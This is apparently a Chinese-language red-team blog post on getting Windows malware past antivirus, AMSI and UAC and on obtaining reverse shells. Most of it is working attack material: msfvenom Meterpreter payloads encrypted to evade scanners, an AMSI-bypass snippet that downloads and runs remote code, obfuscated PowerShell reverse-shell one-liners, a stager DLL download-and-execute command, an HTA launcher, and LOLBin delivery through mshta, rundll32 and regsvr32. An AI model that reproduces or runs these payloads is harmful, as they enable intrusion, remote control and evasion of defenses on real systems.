+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">        Function var_func()</span><br><span class="line">                Dim var_shell</span><br><span class="line">                Set var_shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">                var_shell.run &quot;powershell.exe -nop -w hidden -encodedcommand JABzAD0A。。。。。。&quot;, 0, true</span><br><span class="line">        End Function</span><br><span class="line">        var_func</span><br><span class="line">        self.close</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后生成的时候command写：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://192.168.1.105:8080/test.txt</span><br></pre></td></tr></table></figure>
+
+<p>来源：<a href="https://www.t00ls.net/thread-44032-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-44032-1-1.html</a></p>
+<h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><h3 id="3-1-下载文件的dll"><a href="#3-1-下载文件的dll" class="headerlink" title="3.1 下载文件的dll"></a>3.1 下载文件的dll</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/<span class="built_in">exec</span> CMD=<span class="string">"certutil -urlcache -split -f   http://xxx.xxx.xxx.xxx/xxx.exec:\xxx.exe” -f dll&gt;/root/s.dll</span></span><br></pre></td></tr></table></figure>
+
+<p>生成一个让目标机下载文件的dll，也可以用bitsadmin。然后上控或者传nc之类的反弹shell回来</p>
+<h3 id="3-2-加密"><a href="#3-2-加密" class="headerlink" title="3.2 加密"></a>3.2 加密</h3><p>（加密是一种能够有效反击反病毒软件静态扫描功能的方法，因为AV引擎不能立刻爆破它。目前，这有一些msfvenom支持的加密算法保护你的shellcode:AES256-CBC,RC4,Base64,和XOR。）</p>
+<p>①. reverse_tcp_rc4</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msfvenom -p windows/meterpreter/reverse_tcp_rc4 lhost=外网ip lport=5555 RC4PASSWORD=Wh0ale -f exe &gt;/tmp/rc5.exe</span><br></pre></td></tr></table></figure>
+
+<p>②. encrypt-key</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msfvenom -p windows/meterpreter/reverse_tcp LHOST=外网ip LPORT=5555 --encrypt rc4 --encrypt-key Wh0ale -f exe &gt; /tmp/rc6.exe</span><br></pre></td></tr></table></figure>
+
+<p>③. bind_tcp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msfvenom -p windows/meterpreter/bind_tcp LHOST=外网ip LPORT=443 --encrypt rc4 --encrypt-key Wh0ale -f exe &gt; /tmp/rc1.exe</span><br></pre></td></tr></table></figure>
+
+<p>④. --encrypt-iv</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msfvenom -p windows/meterpreter/reverse_tcp_rc4 EXIT_FUNC=PROCESS LHOST-外网ip LPORT=443 RC4PASSWORD=GeekIsChic --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f exe -o /tmp/meterpreter.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-HTTPS"><a href="#3-3-HTTPS" class="headerlink" title="3.3 HTTPS"></a>3.3 HTTPS</h3><p>①</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_https  lhost=192.168.1.200 lport=443 -f c</span><br><span class="line"></span><br><span class="line">metasploit设置：</span><br><span class="line"></span><br><span class="line">set EnableStageEncoding true</span><br><span class="line"></span><br><span class="line">set stageencoder x86/fnstenv_mov</span><br><span class="line"></span><br><span class="line">set stageencodingfallback false</span><br></pre></td></tr></table></figure>
+
+<p>②</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp_rc4  lhost=192.168.1.200 lport=4444 RC4PASSWORD=Green-m  -f c</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-dns-txt"><a href="#3-4-dns-txt" class="headerlink" title="3.4 dns_txt"></a>3.4 dns_txt</h3><p><a href="https://www.360zhijia.com/360anquanke/353428.html" target="_blank" rel="noopener">https://www.360zhijia.com/360anquanke/353428.html</a></p>
+<h3 id="3-5-动态注入"><a href="#3-5-动态注入" class="headerlink" title="3.5 动态注入"></a>3.5 动态注入</h3><p><strong>①. veil</strong></p>
+<p>Veil是一种可以生成带有Metasploit载荷的后门工具，可以绕过部分杀软的防御，软件本身一直在更新。</p>
+<p><strong>②. Shellter</strong></p>
+<p>Shellter采用了动态Shellcode注入来实现免杀的效果，当用户打开被植入后门的软件时，只有触发一定的操作才会启动后门。</p>
+<p><strong>③. Avet</strong></p>
+<p>git clone <a href="https://github.com/govolution/avet" target="_blank" rel="noopener">https://github.com/govolution/avet</a></p>
+<p>安装完毕后，找到自己想要生成的后门载荷，切到/avet/build/目录下打开相应的.sh文件对LHOST和LPORT进行修改。</p>
+<h3 id="3-6-第三方分离免杀"><a href="#3-6-第三方分离免杀" class="headerlink" title="3.6 第三方分离免杀"></a>3.6 第三方分离免杀</h3><p>payload不采取生成pe文件，而采取shellcode方式，来借助第三方直接加载到内存中。避免行为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -pwindows/x64/meterpreter/reverse_tcp lhost=192.168.1.5 lport=8080 -ex86/shikata_ga_nai -i 5 -f raw &gt; test.c</span><br></pre></td></tr></table></figure>
+
+<p>shellcode方式的payload，那么需要借助第三方来启动，加载到内存。</p>
+<p><a href="https://github.com/clinicallyinane/shellcode_launcher/" target="_blank" rel="noopener">https://github.com/clinicallyinane/shellcode_launcher/</a></p>
+<p><strong>Reference：</strong></p>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=40016&highlight=%E5%85%8D%E6%9D%80" target="_blank" rel="noopener">免杀技术有一套（免杀方法大集结）(Anti-AntiVirus)</a></p>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=39410&highlight=nc" target="_blank" rel="noopener">dll nc 反弹代码(免杀)</a></p>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=46304&highlight=nc" target="_blank" rel="noopener">NC反弹代码_服务配置端(免杀)</a></p>
+<p><a href="https://www.t00ls.net/thread-44032-1-1.html" target="_blank" rel="noopener">custom_command_dll</a></p>
+<p><a href="https://github.com/ohpe/juicy-potato/" target="_blank" rel="noopener">烂土豆提权</a></p>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=39413&extra=&highlight=%E6%96%B9%E7%A8%8B%E5%BC%8F&page=2" target="_blank" rel="noopener">方程式工具</a></p>
+<p><a href="https://blog.csdn.net/CloudAtlasM/article/details/79039391" target="_blank" rel="noopener">DKMC</a></p>
+<h1 id="0x02-bypass-360"><a href="#0x02-bypass-360" class="headerlink" title="0x02 bypass_360"></a>0x02 bypass_360</h1><h2 id="一、AMSI-bypass"><a href="#一、AMSI-bypass" class="headerlink" title="一、AMSI_bypass"></a>一、AMSI_bypass</h2><p><strong>1.生成shellcode放入apache服务器中</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x64 -plateform windows -p windows/x64/meterpreter/reverse_tcp lhost=118.25.69.199 lport=4444 -f psh -o shellcode.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.msfconsole开始监听</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 118.25.69.199</span><br><span class="line">lhost =&gt; 192.168.211.179</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.在目标机器执行powershell</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ScriptBlock].<span class="string">"Get`Fiel`d"</span>(<span class="string">'signatures'</span>,<span class="string">'N'</span>+<span class="string">'onPublic,Static'</span>).SetValue(<span class="literal">$NULL</span>,(<span class="built_in">New-Object</span> Collections.Generic.HashSet[string]));</span><br><span class="line">     <span class="variable">$e</span>=<span class="built_in">new-object</span> net.webclient;</span><br><span class="line">     <span class="variable">$e</span>.proxy=[Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line">     <span class="variable">$e</span>.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;</span><br><span class="line">     IEX <span class="variable">$e</span>.downloadstring(<span class="string">'http://118.25.69.199/shellcode/9988.txt'</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>4.拿到shell</strong></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3kzc2zdyj20zw082wh5.jpg" alt="img"></p>
+<h2 id="二、Invoke-Obfuscation-psd1"><a href="#二、Invoke-Obfuscation-psd1" class="headerlink" title="二、Invoke-Obfuscation.psd1"></a>二、Invoke-Obfuscation.psd1</h2><p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fzgeno8savj20kq0370tf.jpg" alt></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> ./Invoke-Obfuscation.psd1</span><br><span class="line">Invoke-Obfuscation</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3l0gc3gwj20hs0c63yr.jpg" alt="img"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Obfuscation&gt; set ScriptBlock ls Invoke-Obfuscation&gt; ENCODING</span><br><span class="line"></span><br><span class="line">Invoke-Obfuscation\Encoding&gt; <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3l0zh7chj20ig0dnmxf.jpg" alt="img"></p>
+<p>生成混淆payload：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Obfuscation&gt; set ScriptBlock . F:\Privilege\nishang-master\Shells\Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddres <span class="number">192.168</span>.<span class="number">211.179</span> -Port <span class="number">4444</span></span><br><span class="line">Invoke-Obfuscation&gt; encoding</span><br><span class="line"></span><br><span class="line">Invoke-Obfuscation\Encoding&gt; <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>编码后如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; ( $eNV:ComsPec[4,15,25]-JOin&apos;&apos;)(( &apos;73T65T74&#123;20!53J63!72Z69J70y74y42w6cT6fy63&#123;6bJ20Z2e;20w46&#123;3aT5cw50!72y69;76w69J6c;65!67&#123;65;5cJ6e!69Z73J68;61w6eZ67!2d;6dy61T73;74J65;72T5cJ53Z68J65w6c!6cT73T5c&#123;49J6ew76y6fy6b&#123;65w2dZ50!6f&#123;77w65T72J53y68;65T6cw6cT54y63!70w2e!70Z73&#123;31&#123;3b&#123;20&#123;49J6e!76Z6fy6bT65T2dJ50w6f!77!65;72;53!68J65y6cw6cZ54T63!70!20;2dJ52J65w76Z65y72w73w65!20!2d;49Z50T41T64J64!72w65T73T20&#123;31;31;38J2ey32J35&#123;2e;36&#123;39!2e;31w39Z39!20Z2d!50!6fT72!74&#123;20T34J34J34Z34&apos; -spLiT&apos;J&apos;-SPlIt&apos;;&apos; -spLIt&apos;!&apos;-SPlIT&apos;y&apos; -SPliT &apos;&#123;&apos; -SPLIt &apos;w&apos; -SPLIT &apos;T&apos; -Split&apos;Z&apos;|%&#123;([chAr] ([CoNVerT]::toiNt16(( $_.TOstRiNg()),16 ) ))&#125;) -JOiN&apos;&apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3l3yess7j20pn05kaa6.jpg" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3l4f4h62j20zk0qx10g.jpg" alt="img"></p>
+<h2 id="三、stager-dll-master"><a href="#三、stager-dll-master" class="headerlink" title="三、stager.dll-master"></a>三、stager.dll-master</h2><p>meterpreter.rc</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3l5wtadsj20uw0fjduq.jpg" alt="img"></p>
+<p>启动msf5</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msfconsole -r ./stager.dll -master/meterpreter.rc</span><br></pre></td></tr></table></figure>
+
+<p>生成payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msfvenom -p windows/meterpreter/reverse_tcp_rc4 EXIT_FUNC=PROCESS LHOST-192.168.211.179 LPORT=443 RC4PASSWORD=GeekIsChic --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /tmp/meterpreter.c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3l7f5ba2j20iw05m76m.jpg" alt="img"></p>
+<p>生成exp：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3l80v1dij20el0b5jry.jpg" alt="img"></p>
+<p>靶机执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 stager.dll,Exec</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3l9buhhjj211x0buwsa.jpg" alt="img"></p>
+<p>②dll放入服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$env</span>:temp+<span class="string">'\'</span>+(Get-Random)+<span class="string">'.dll'</span>; (New-Object System.Net.WebClient).DownloadFile(<span class="string">'http://192.168.211.179/Privilege/stager.dll'</span>,<span class="variable">$file</span>); <span class="variable">$exec</span> = New-Object -com shell.application; <span class="variable">$exec</span>.shellexecute(<span class="string">'rundll32'</span>,<span class="variable">$file</span>+<span class="string">',Exec'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>powershell混淆</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd Invoke-Obfuscation &amp;&amp; powershell -exec bypass -c &quot;Import-Module ./Invoke-Obfuscation.psd1;Invoke-Obfuscation&quot;</span><br></pre></td></tr></table></figure>
+
+<p>混淆这条命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = $env:temp+&apos;\&apos;+(Get-Random)+&apos;.dll&apos;; (New-Object System.Net.WebClient).DownloadFile(&apos;http://外网ip/stager.dll&apos;,$file); $exec = New-Object -com shell.application; $exec.shellexecute(&apos;rundll32&apos;,$file+&apos;,Exec&apos;);</span><br></pre></td></tr></table></figure>
+
+<p>然后再对方主机powershell执行</p>
+<p>由此可以免杀</p>
+<p><a href="https://github.com/phackt/stager.dll" target="_blank" rel="noopener">https://github.com/phackt/stager.dll</a></p>
+<p>reference:</p>
+<p><a href="http://www.secist.com/archives/7195.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">http://www.secist.com/archives/7195.html?tdsourcetag=s_pctim_aiomsg</a></p>
+<p><a href="https://bbs.silic.wiki/thread-3039-1-1.html" target="_blank" rel="noopener">求助] Apache 2.2.14 mod_isapi Dangling Pointer漏洞用法</a></p>
+<p><a href="http://www.secist.com/archives/4809.html" target="_blank" rel="noopener">我的shellcode编写之路</a></p>
+<p><a href="https://paper.seebug.org/29/" target="_blank" rel="noopener">渗透攻防工具篇-后渗透阶段的Meterpreter</a></p>
+<h1 id="0x03-bypass-uac"><a href="#0x03-bypass-uac" class="headerlink" title="0x03 bypass_uac"></a>0x03 bypass_uac</h1><p>这几天看到的bypass 方法比较多，趁今天有空做个总结</p>
+<h2 id="一、cmstp-exe作为绕过UAC"><a href="#一、cmstp-exe作为绕过UAC" class="headerlink" title="一、cmstp.exe作为绕过UAC"></a>一、cmstp.exe作为绕过UAC</h2><p>利用microsoft的 “cmstp.exe”作为绕过UAC</p>
+<p>其主要原理采用c#生成带有dll反射的的powershell脚本，amsi检测不到</p>
+<p>关于amsi的文章参考：</p>
+<p><a href="https://xz.aliyun.com/t/3095" target="_blank" rel="noopener">https://xz.aliyun.com/t/3095</a></p>
+<p>这里的文件编译号生成为dll文件</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehrf4diqj211z09oq5i.jpg" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehvgal9qj20z10eejt9.jpg" alt="img"></p>
+<p>执行即可弹出administrator的命令行</p>
+<p>另附自动化脚本放在附件里</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehvqrnfsj211y0kb43g.jpg" alt="img"></p>
+<p>这里看到与表哥复现</p>
+<p>通过远程iex下载我们的执行命令脚本</p>
+<p>生成一个直接执行命令的exe</p>
+<p>①</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell iex (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'http://InvokePowerShellTcp.ps1'</span>);Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]</span><br></pre></td></tr></table></figure>
+
+<p>②</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">"IEX ((new-object net.webclient).downloadstring('http://192.168.211.179:80/a'))"</span></span><br></pre></td></tr></table></figure>
+
+<p>但是如何修改代码生成可执行命令的exe和脚本，还没弄懂 有时间大佬可以研究研究</p>
+<h2 id="二、DKMC"><a href="#二、DKMC" class="headerlink" title="二、DKMC"></a>二、DKMC</h2><p>使用方法：</p>
+<p>(gen) Generate a malicious BMP image //创建一张恶意BMP格式的图片</p>
+<p>(web) Start a web server and deliver malicious image //启动web服务（内置）并传送恶意图片</p>
+<p>(ps) Generate Powershell payload //创建Powershell 有效载荷</p>
+<p>(sc) Generate shellcode from raw file //从原始文件生成shellcode</p>
+<p>(exit) Quit the application //退出</p>
+<p>生成shellcode kali ip： 192.168.0.107</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=9999 -f raw  &gt; /opt/shellcode</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehvz10mtj20iv0jv40n.jpg" alt="img"></p>
+<p>DKMC生成shellcode</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehw5aawkj20j00jp76v.jpg" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehwb3qxvj20jc0kfacq.jpg" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehwg1wxij20iw05i74x.jpg" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehwk95jjj20jc0kfn01.jpg" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehwohiwyj20jc0kfq6b.jpg" alt="img"></p>
+<p>这个之前尝试是可以弹shell的，今天不知道为啥不行…..我改天再试试看，原理就是把shellcode放入bmp文件中</p>
+<h1 id="0x04-get-reverse-shell"><a href="#0x04-get-reverse-shell" class="headerlink" title="0x04 get-reverse-shell"></a>0x04 get-reverse-shell</h1><p>表中的内容</p>
+<p><strong>Mshta.exe</strong></p>
+<ul>
+<li>通过Metasploit的HTA Web Server启动HTA攻击</li>
+</ul>
+<p><strong>RUNDLL32.EXE</strong></p>
+<ul>
+<li>通过SMB交付Metasploit启动Rundll32攻击</li>
+</ul>
+<p><strong>Regsvr32.exe</strong></p>
+<ul>
+<li>通过Metasploit的脚本Web交付启动Regsvr32</li>
+</ul>
+<p><strong>Certutil.exe</strong></p>
+<ul>
+<li>通过Msfvenom C＃shellcode启动MSbuild攻击</li>
+</ul>
+<p><strong>Powershell.exe</strong></p>
+<ul>
+<li>通过Powershell启动Powercat攻击</li>
+<li>通过Powershell启动cscript.exe</li>
+<li>通过Powershell启动批处理文件攻击</li>
+</ul>
+<p><strong>msiexec.exe</strong></p>
+<ul>
+<li>通过msfvenom启动msiexec攻击</li>
+</ul>
+<p><strong>Wmic.exe</strong></p>
+<ul>
+<li>通过Koadic发起Wmic.exe攻击</li>
+</ul>
+<h2 id="一、Mshta-exe"><a href="#一、Mshta-exe" class="headerlink" title="一、Mshta.exe"></a>一、Mshta.exe</h2><p>Mshta.exe运行Microsoft HTML应用程序主机，Windows OS实用程序负责运行<strong>HTA</strong>（HTML应用程序）文件。我们可以运行JavaScript或Visual的HTML文件。您可以使用Microsoft MSHTA.exe工具解释这些文件。</p>
+<p>Metasploit包含“HTA Web Server”模块，可生成恶意hta文件。此模块托管HTML应用程序（HTA），打开时将通过Powershell运行有效负载。当用户导航到HTA文件时，在执行有效负载之前，IE将提示他们两次。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/misc/hta_server</span><br><span class="line">msf exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> srvhost 192.168.1.109</span><br><span class="line">msf exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> lhost 192.168.1.109</span><br><span class="line">msf exploit(windows/misc/hta_server) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>现在通过受害者计算机上的mshta.exe（易受RCE攻击）运行恶意代码以获取计时器会话。</p>
+<p><img src="https://i0.wp.com/3.bp.blogspot.com/-vRQoGXf6Hxc/XERxDCNVrRI/AAAAAAAAcIA/-HNjlqYKAjQpdD2BUOGPCfcE3-Qn1RfwwCLcBGAs/s1600/1.png?w=687&ssl=1" alt="img"></p>
+<p>一旦您在mshta.exe的帮助下在远程计算机上执行恶意hta文件，您将在本地计算机（Kali Linux）上获得反向连接。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i2.wp.com/3.bp.blogspot.com/-WojuVBITUBA/XERxFcLMnDI/AAAAAAAAcIc/VIRbJgR_0KMAonf3QaFGRwgJ9zF2xFgjQCLcBGAs/s1600/2.png?w=687&ssl=1" alt="img"></p>
+<p>您可以观察到，我们有受害者的计时器会话，如下所示：</p>
+<p><img src="https://i2.wp.com/2.bp.blogspot.com/-LxXWG6Wp9tA/XERxHkuPN8I/AAAAAAAAcI8/-Cs5h6XR0jg1nqOG_qg7NH0LcJo1wJ2lwCLcBGAs/s1600/3.png?w=687&ssl=1" alt="img"></p>
+<h2 id="二、RUNDLL32-EXE"><a href="#二、RUNDLL32-EXE" class="headerlink" title="二、RUNDLL32.EXE"></a>二、RUNDLL32.EXE</h2><p>Rundll32.exe与Windows操作系统相关联，允许您调用从<strong>DLL</strong>导出的函数（16位或32位）并将其存储在适当的内存库中。</p>
+<p><strong>通过SMB交付Metasploit启动Rundll32攻击</strong></p>
+<p>Metasploit还包含“SMB Delivery”模块，可生成恶意dll文件。该模块通过SMB服务器提供有效负载，并提供检索和执行生成的有效负载的命令。目前支持DLL和Powershell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/smb_delivery</span><br><span class="line">msf exploit(windows/smb/smb_delivery) &gt; <span class="built_in">set</span> srvhost 192.168.1.109</span><br><span class="line">msf exploit(windows/smb/smb_delivery) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>现在<strong>通过受害计算机上的rundll32.exe运行恶意代码（易受RCE攻击）以获取计时器会话</strong>。</p>
+<p><img src="https://i1.wp.com/4.bp.blogspot.com/-9RiWJSgc9kc/XERxKTU-01I/AAAAAAAAcJo/8zVtmo3pB_oHEiS2jutBghqlEEMFGZvpwCLcBGAs/s1600/9.png?w=687&ssl=1" alt="img"></p>
+<p>一旦您在rundll32.exe的帮助下在远程计算机上执行dll文件，您将在本地计算机（Kali Linux）上获得反向连接。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll3.exe \\192.168.1.109\vabFG\test.dll,0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.wp.com/1.bp.blogspot.com/-DoAZZYKv1GY/XERxDGuR4DI/AAAAAAAAcIE/ajlIITUcoZw9M4H6AtJz34kvNUo9YYFfQCLcBGAs/s1600/10.png?w=687&ssl=1" alt="img"></p>
+<p>您可以观察到，我们有受害者的计时器会话，如下所示：</p>
+<p><img src="https://i0.wp.com/4.bp.blogspot.com/-3C7oXVJUYzk/XERxDXzYtCI/AAAAAAAAcII/V1mhJdqQq7IUHP0uWAoYd46qmWk-2uIyQCLcBGAs/s1600/11.png?w=687&ssl=1" alt="img"></p>
+<h2 id="三、Regsvr32-exe"><a href="#三、Regsvr32-exe" class="headerlink" title="三、Regsvr32.exe"></a>三、Regsvr32.exe</h2><p>Regsvr32是一个命令行实用程序，用于注册和取消注册OLE控件，例如Windows注册表中的<strong>DLL</strong>和ActiveX控件。Regsvr32.exe安装在Windows XP及更高版本的Windows的％systemroot％\ System32文件夹中。</p>
+<p>RegSvr32.exe具有以下命令行选项：</p>
+<blockquote>
+<p>语法：Regsvr32 [/ s] [/ u] [/ n] [/ i [：cmdline]] dllname</p>
+<p>/ u - 取消注册server<br>/ i - 调用DllInstall传递一个可选的[cmdline]; 当它与/ u一起使用时，它调用dll uninstall<br>/ n - 不要调用DllRegisterServer; 此选项必须与/ i<br>/ s一起使用 - 无声; 不显示消息框</p>
+</blockquote>
+<p><strong>通过Metasploit的脚本Web交付启动Regsvr32</strong></p>
+<p>该模块可以快速启动为有效负载提供服务的Web服务器。提供的命令将允许有效负载下载和执行。它将通过regsvr32.exe指定脚本语言解释器或“squiblydoo”来绕过应用程序白名单。此模块的主要目的是在攻击者必须手动输入命令时快速在目标计算机上建立会话：例如命令注入。</p>
+<p>Regsvr32使用“squiblydoo”技术绕过应用程序白名单。签名的Microsoft二进制文件Regsvr32能够请求.sct文件，然后在其中执行包含的PowerShell命令。两个Web请求（即<strong>.sct文件和PowerShell</strong>下载/执行）都可以在同一端口上发生。“PSH（Binary）”会将文件写入磁盘，允许自定义二进制文件被下载/执行。</p>
